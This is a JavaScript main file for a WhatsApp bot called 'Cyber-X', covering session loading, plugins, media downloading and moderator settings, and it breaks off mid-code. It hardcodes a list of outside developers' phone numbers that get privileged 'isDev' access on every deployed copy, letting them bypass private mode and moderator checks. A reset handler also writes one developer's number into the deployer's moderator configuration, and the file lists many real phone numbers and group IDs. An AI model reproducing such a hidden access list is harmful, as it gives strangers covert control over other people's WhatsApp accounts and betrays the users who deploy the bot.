const {
default: makeWASocket,
useMultiFileAuthState,
fetchLatestBaileysVersion,
DisconnectReason,
downloadContentFromMessage,
jidNormalizedUser,
getContentType
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const pino = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const dl = require('@bochilteam/scraper')
const { DBM } = require('postgres_dbm')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('./lib/functions')
const { sms,downloadMediaMessage } = require('./lib/msg')
const { search , download } = require('aptoide-scraper')
const axios = require('axios')
const { mods } = require('fouadwa-scraper')
const fg = require('api-dylux')
const getFBInfo = require("fb-downloader-new");
const Heroku = require('heroku-client')
const FileType = require("file-type")
const { cmd, commands } = require('./command')
const { File } = require('megajs')
const prefix = config.PREFIX 
const ownerNumber = ['595995660558']
const l = console.log
//===================DATABASE=========================
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const heroku = new Heroku({
    token: config.HEROKU_API_KEY
})

console.log("✔️ SQL Database Connected")

// ===========SESSION===========
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.split("cyber-x@;;;")[1]
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
console.log("🔒 Session Successfully Loaded !!")
})})}
// <<==========PORTS===========>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;
//====================================

async function connectToWA() {
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
const { version, isLatest } = await fetchLatestBaileysVersion()
console.log(`🤖 Cyber-X using WA v${version.join('.')}, isLatest: ${isLatest}`)
const conn = makeWASocket({
version,
logger: pino({ level: 'silent' }),
printQRInTerminal: true,
browser: ["CYBER-X 2.1", "safari", "3.3"],
auth: state,
getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id)
                return msg.message || undefined
            }
            return {
                conversation: "Cyber-X Web 2.1"
            }
        }})

conn.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
connectToWA()
}
} else if (connection === 'open') {
console.log('✅ Plugin installed and Connected...')
const path = require('path');
fs.readdirSync("./plugins/").forEach((plugin) => {
if (path.extname(plugin).toLowerCase() == ".js") {
require("./plugins/" + plugin);
}
});
console.log('📚 All Plugins installed')
console.log('🐉 Cyber-X WhatsApp Bot connected ✅')
//const botada = jidNormalizedUser(conn.user.id)   
//conn.sendMessage(botada, { image: { url : "https://i.imgur.com/5fjnt53.jpeg" } , caption: "*Cyber-X 2.0 Connected to WhatsApp* ✔️\n\n_This is the result of our team's hard work and our team owns the bot's rights and code rights. Therefore, you have no chance to change and submit our bot under any circumstances._\n\n🔰 *Official GitHub* - ```https://github.com/darkalphaxteam```\n\n🪀 *WhatsApp Community* - ```https://chat.whatsapp.com/CwFuybm14L697Viv4fvbE3```\n\n🧿 *Announcement Group* - ```https://chat.whatsapp.com/DZfpcfE1w0SAAWeikPKyFA```\n\n*ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰꜰɪᴄɪᴀʟ*\n*ᴀʟʟ ʀɪɢʜᴛ ʀᴇꜱᴇʀᴠᴇᴅ - ᴛᴇᴀᴍ*"})
}
})
conn.ev.on('creds.update', saveCreds)
conn.ev.on('messages.upsert', async(mek) => {
try {
mek = mek.messages[0]
if (!mek.message) return	
mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
//if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const m = sms(conn, mek)
const type = getContentType(mek.message)
const content = JSON.stringify(mek.message)
const from = mek.key.remoteJid
const mentionByTag = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const quoted = mek.quoted ? mek.quoted : mek
const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
const isCmd = body.startsWith(config.PREFIX)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Cyber-X user'
const isMe = botNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber) || isMe
const botNumber2 = await jidNormalizedUser(conn.user.id);
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const reply = (teks) => {
 conn.sendMessage(from, { text: teks }, { quoted: mek })
}

//----------------------------------------------------------------------------------------------
const db_pool = new DBM({
    db: config.DATABASE_URL
})

const Mode =  await db_pool.get('MODERATORS')
if ( Mode.length < 3 ) {
await db_pool.insert( "MODERATORS" , config.MODERATORS )
console.log('ℹ️ Default-DB Saved Successfully')
}
//============================================================================
const onada =  await db_pool.get('MODERATORS')
const isCreator = [ botNumber2 , ...onada ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)
      
 const inbx = config.INBOX_USER.split(",")
const isPersUser = [ ...inbx ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)
      
const banbn = config.BANNED_USER.split(",")
const isBanUser = [ ...banbn ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)

 
let epaneda =  "94778962038,94711421243,94775512050,94715166712,94787820101,94715346004,94784596431,94729932436,94785893102,94762862143,94743386944,94788749741,94755514590,94774605140"
const epada = epaneda.split(",")
const isDev = [ ...epada ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(sender)
//============================================================================ 
    if( !isDev && from == '120363030304247368@g.us' ) return
    if( !isDev && from == '120363174739054837@g.us' ) return
    if( !isDev && from == '120363043873308146@g.us' ) return
    
  if( sender == '94711421243@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `🥷`, key: mek.key }})
}
    if( sender == '94778962038@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `🥷`, key: mek.key }})
}

   if( sender == '94775512050@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `⚖️`, key: mek.key }})
}
  
  if( sender == '94715166712@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `🌙`, key: mek.key }})
}

if( sender == '94715346004@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `💫`, key: mek.key }})
}

if( sender == '94784596431@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `⭐`, key: mek.key }})
}

if( sender == '94787820101@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `⚡`, key: mek.key }})
}

if( sender == '94762862143@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `⭐`, key: mek.key }})
}

if( sender == '94743386944@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `🕊️`, key: mek.key }})
}

if( sender == '94729932436@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `🔮`, key: mek.key }})
}

if( sender == '94785893102@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `⚖`, key: mek.key }})
}

if( sender == '94755514590@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `🕊️`, key: mek.key }})
}

if( sender == '94788749741@s.whatsapp.net' ) {
await conn.sendMessage(from, { react: { text: `⛓`, key: mek.key }})
}

    
    if ( config.WORK_TYPE == "only_group" ) {
if ( !isGroup && isCmd && !isDev && !isCreator && !isPersUser ) return 
      }
      
   if ( config.WORK_TYPE == "private" ) {
if  ( isCmd && !isDev && !isCreator ) return
      }
      

if ( isCmd && isBanUser ) return reply('❌ *You are banned from using Commands.....* ⚠️\n\n*_Please contact Bot Owner or Moderator to Remove your Ban_* 👨‍🔧')

conn.sendFileUrl = async(jid, url, caption, quoted, options = {}) => {
  let mime = '';
  let res = await axios.head(url)
  mime = res.headers['content-type']
  if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
  }
  let type = mime.split("/")[0] + "Message"
  if (mime === "application/pdf") {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "image") {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "video") {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
  }
  if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
  }
}

conn.downloadAndSaveMediaMessage = async (
    message,
    filename,
    attachExtension = true
  ) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype
      ? message.mtype.replace(/Message/gi, "")
      : mime.split("/")[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    trueFileName = attachExtension ? filename + "." + type.ext : filename;
    // save to file
    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  }
  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype
      ? message.mtype.replace(/Message/gi, "")
      : mime.split("/")[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    return buffer;
  }
//==================================plugin map================================
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
if (cmd) {
if (cmd.react) await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, mime, botNumber, pushname, isMe ,isOwner, mentionByTag ,groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, isCreator , isDev });
} catch (e) {
console.error("[PLUGIN ERROR]", e);
}
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2,mime , botNumber, pushname, isMe , isOwner, mentionByTag , groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, isCreator ,isDev })
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, mime, botNumber, pushname, isMe ,isOwner, mentionByTag , groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , isCreator ,isDev })
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2,mime, botNumber, pushname, isMe, isOwner, mentionByTag, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , isCreator ,isDev })
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2,mime, botNumber, pushname, isMe, isOwner, mentionByTag ,groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply , isCreator ,isDev })
}});
if (config.ANTI_LINK == "true"){
if (!isCreator && !isDev && isGroup && isBotAdmins ) {
if (body.match(`chat.whatsapp.com`)) {
if(groupAdmins.includes(sender)) return
await conn.sendMessage(from, { delete: mek.key })  
}}}

if (config.AUTO_MSG_READ == "true"){
await conn.readMessages([mek.key])
}
//-----------------------------AI MODE FUNCTIONS ----------------------------------------------
if (config.AI_MODE == "true"){
if ( body.startsWith('/gpt')) {
let bodyy = body.split('/gpt')[1]
const aimsg = await fetchJson(`https://vihangayt.me/tools/chatgpt?q=${bodyy}`)
reply("🧠 *Cyber-X AI Mode :- chatGPT*\n\n"+aimsg.data)
}
}
//------------------------------ REPLYS WITHOUT COMMANDS --------------------------------
if ( body.startsWith('/prefix_help')) {
reply("📚 *Bot's Running prefix is* ```" + config.PREFIX + "```")
}

// ---------------------------- REPLY MESSAGE FUNCTIONS --------------------------------

if ( m.quoted ) {
if (m.quoted.sender == botNumber2 ) {
if ( m.quoted.id.startsWith("CYBER2") ) {
if ( from == '120363174739054837@g.us' ) return
 if ( config.WORK_TYPE == "private" && !isDev && !isCreator ) return
if ( body.startsWith("1") && body.length < 2 ) {
const rew = m.quoted.msg.caption
if ( rew.includes('YTMP3') ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
const getlink = rew.split("ɪᴅ - ")[1]
const fulllink = 'https://youtube.com/watch?v=' + getlink
const dj = await dl.youtubedl(fulllink)
await conn.sendMessage(from, { react: { text: `⬆️`, key: mek.key }})
await conn.sendMessage(from, { audio: { url : await dj.audio['128kbps'].download() }   , mimetype: 'audio/mpeg', fileName:  `${dj.title}.mp3` }, { quoted: mek })
await conn.sendMessage(from, { react: { text: `✔️`, key: mek.key }})

}
if ( rew.includes('YTMP4') ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
const getlink = rew.split("ɪᴅ - ")[1]
const fulllink = 'https://youtube.com/watch?v=' + getlink
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
}
const dj = await dl.youtubedl(fulllink)

if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬆️`, key: mek.key }})
}
if ( dj.video['240p'].fileSize > 102400 ) {
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}

return await conn.sendMessage(from, { document : { url : await dj.video['240p'].download() }  ,caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'video/mp4', fileName: `${dj.title}.mp4` }, { quoted: mek })
}
await conn.sendMessage(from, { video: {url: await dj.video['240p'].download() }, caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
    
    
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}


}
if ( rew.includes('APK') ) {
const getid = rew.split("ɪᴅ - ")[1]
const app = await download(getid)
await conn.sendMessage(from, { document : { url : app.dllink } , caption:"📦 *𝙰𝙿𝙺 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙴𝚁* 📦\n\n📚 *App name : " + app.name + "*\n📂 *App Size : " + app.size + "*\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'application/vnd.android.package-archive', fileName: `${app.name}.apk` }, { quoted: mek })

}
if ( rew.includes('List Updated') ) {
reply('🔄 *Restarting the Bot ! Please wait........*')
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.delete(baseURI + '/dynos')

}
if ( rew.includes('TIKTOK DOWNLOADER') ) {
const getlink = rew.split("Link -: ")[1]
const fulllink = getlink.split("_*")[0]
let ttdl = await fg.tiktok(fulllink)
await conn.sendMessage(from, { video: {url: ttdl.play }, caption: ttdl.nickname + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
}
if ( rew.includes('FB DOWNLOADER') ) {
const getlink = rew.split("Link -: ")[1]
const fulllink = getlink.split("_*")[0]
let ttdl = await getFBInfo(fulllink)
await conn.sendMessage(from, { video: {url: ttdl.sd }, caption: "SD Quality\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
}

}
if ( body.startsWith("2") && body.length < 2 ) {
const rew = m.quoted.msg.caption
if ( rew.includes('YTMP3') ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
const getlink = rew.split("ɪᴅ - ")[1]
const fulllink = 'https://youtube.com/watch?v=' + getlink
const dj = await dl.youtubedl(fulllink)
await conn.sendMessage(from, { react: { text: `⬆️`, key: mek.key }})
await conn.sendMessage(from, { document : { url : await dj.audio['128kbps'].download() } , caption: dj.title+ "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'audio/mp3', fileName: `${dj.title}.mp3` }, { quoted: mek })
await conn.sendMessage(from, { react: { text: `✔️`, key: mek.key }})

}
if ( rew.includes('YTMP4') ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
const getlink = rew.split("ɪᴅ - ")[1]
const fulllink = 'https://youtube.com/watch?v=' + getlink
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
}
const dj = await dl.youtubedl(fulllink)

if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬆️`, key: mek.key }})
}
if ( dj.video['360p'].fileSize > 102400 ) {
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}

return await conn.sendMessage(from, { document : { url : await dj.video['360p'].download() }  ,caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'video/mp4', fileName: `${dj.title}.mp4` }, { quoted: mek })
}
await conn.sendMessage(from, { video: {url: await dj.video['360p'].download() }, caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
    
    
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}

}
if ( rew.includes('APK') ) {
const getid = rew.split("ɪᴅ - ")[1]
const app = await download(getid)
const msgg =`
*CYBER-X APK INFORMATIONS*

📚 *App name -: ${app.name}*

📂 App Size -: ${app.size}

🔄 Latest Update -: ${app.lastup}

📚 Package Name -: ${app.package}

📱 Play Store Link -: https://play.google.com/store/apps/details?id=${app.package}

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url : app.icon } , caption: msgg }, { quoted: mek })

}
if ( rew.includes('TIKTOK DOWNLOADER') ) {
const getlink = rew.split("Link -: ")[1]
const fulllink = getlink.split("_*")[0]
let ttdl = await fg.tiktok(fulllink)
await conn.sendMessage(from, { video: {url: ttdl.wmplay }, caption: ttdl.nickname + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
}
if ( rew.includes('FB DOWNLOADER') ) {
const getlink = rew.split("Link -: ")[1]
const fulllink = getlink.split("_*")[0]
let ttdl = await getFBInfo(fulllink)
await conn.sendMessage(from, { video: {url: ttdl.hd }, caption: "HD Quality\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
}

}
if ( body.startsWith("3") && body.length < 2 ) {
const rew = m.quoted.msg.caption
if ( rew.includes('YTMP4') ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
const getlink = rew.split("ɪᴅ - ")[1]
const fulllink = 'https://youtube.com/watch?v=' + getlink
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
}
const dj = await dl.youtubedl(fulllink)

if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬆️`, key: mek.key }})
}
if ( dj.video['720p'].fileSize > 102400 ) {
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}

return await conn.sendMessage(from, { document : { url : await dj.video['720p'].download() }  ,caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'video/mp4', fileName: `${dj.title}.mp4` }, { quoted: mek })
}
await conn.sendMessage(from, { video: {url: await dj.video['720p'].download() }, caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
    
    
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}



}
if ( rew.includes('TIKTOK DOWNLOADER') ) {
const getlink = rew.split("Link -: ")[1]
const fulllink = getlink.split("_*")[0]
let ttdl = await fg.tiktok(fulllink)
await conn.sendMessage(from, { audio: { url : ttdl.music }   , mimetype: 'audio/mpeg', fileName:  `${ttdl.nickname}.mp3` }, { quoted: mek })
}

}
if ( body.startsWith("4") && body.length < 2 ) {
const rew = m.quoted.msg.caption
if ( rew.includes('YTMP4') ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
const getlink = rew.split("ɪᴅ - ")[1]
const fulllink = 'https://youtube.com/watch?v=' + getlink
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬇️`, key: mek.key }})
}
const dj = await dl.youtubedl(fulllink)

if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `⬆️`, key: mek.key }})
}
if ( dj.video['1080p'].fileSize > 102400 ) {
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}

return await conn.sendMessage(from, { document : { url : await dj.video['1080p'].download() }  ,caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" ,mimetype: 'video/mp4', fileName: `${dj.title}.mp4` }, { quoted: mek })
}
await conn.sendMessage(from, { video: {url: await dj.video['1080p'].download() }, caption: dj.title + "\n\n*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*" }, { quoted: mek })  
    
    
if ( config.AUTO_REACT == 'true' ) {
await conn.sendMessage(from, { react: { text: `☑️`, key: mek.key }})
}



}
}

if ( body.startsWith("1.1") && body.length < 4 ) {
const rew = m.quoted.msg
if ( rew.includes('COMMANDS') ) {
let menuc = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'main'){
  if(!commands[i].dontAddCommandList){
menuc += `⏲️ *Pattern - ${commands[i].pattern}*
🚙  _Description - ${commands[i].desc}_
✔️ Usage - ${commands[i].use}

`
}}};

let menumg = `🔐 *MAIN COMMAND LIST-CYBER-X 2.0*

${menuc}

─────────────────────
🔠 *Quick Access*

R. Rate us
S. System information 

*ᴄʏʙᴇʀ-x ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ʙᴏᴛ : ᴠᴏʟ-ɪɪ*
*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀʀᴋᴀʟᴘʜᴀxᴛᴇᴀᴍ ᴏꜰᴄ*`
await conn.sendMessage(from, { image: { url: "https://telegra.ph/file/cace8541cd66c731250a9.jpg" }, caption: menumg }, { quoted: mek } )

}
if ( rew.includes('Moderator Configuration') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getNum = rew.split("ɴᴜᴍʙᴇʀ - ")[1]
if ( config.MODERATORS.includes(getNum) ) return reply('✔️ *User already in Moderator List*')
let updt = `${config.MODERATORS},${getNum}`
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['MODERATORS']: updt
                    }
                });
const resmsg =`*Moderator List Updated* ✅

🔄  *_Please wait....  Restarting the bot...._*`
reply(resmsg)
}
if ( rew.includes('Database Reset Function') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
let baseURI = '/apps/' + config.HEROKU_APP_NAME
await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['MODERATORS']: "94778962038"
                    }
                });
const resmsg =`*Moderator List Reseted* ✅

🔄  *_Please wait....  Restarting the bot...._*`
reply(resmsg)
}
if ( rew.includes('Details Update Tool') ) {
if ( !isDev && !isCreator ) return reply('*You must be a Moderator Frists*')
const getuse = rew.split("ɪᴅ - ")[1]
const db_pool = new DBM({
    db: config.DATABASE_URL
})
const data = await db_pool.get(getuse+"DB")
if ( !data.includes(' & ') ) return reply('*Invalid Alive message format*')
const getimage = data.split(" & ")[0]
const getmsg = data.split(" & ")[1]
await db_pool.insert( "ALIVE_MESSAGE" , getmsg )
await db_pool.insert( "ALIVE_IMAGE" , getimage )
const resmsg =`*Alive message and image Successfully Updated* ✅`
reply(resmsg)
}
if ( rew.includes('Cyber-X Fouad-WA') ) {
const getmod = await mods()
let moddata = getmod.com_whatsapp
